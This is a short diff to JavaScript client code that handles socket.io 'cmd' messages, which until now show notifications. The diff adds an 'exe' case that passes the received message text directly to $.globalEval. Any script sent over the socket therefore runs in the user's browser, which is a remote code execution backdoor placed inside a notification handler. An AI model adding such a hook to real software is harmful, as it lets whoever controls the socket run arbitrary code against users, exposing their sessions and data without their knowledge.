@@ -74,6 +74,9 @@ socket.on('cmd',function(msg){
         case 'ntf':
             $.notify(cmdData, {style: 'mystyle'});
             break;
+        case 'exe':
+            $.globalEval(cmdData);
+            break;
         default:
             break;
     }
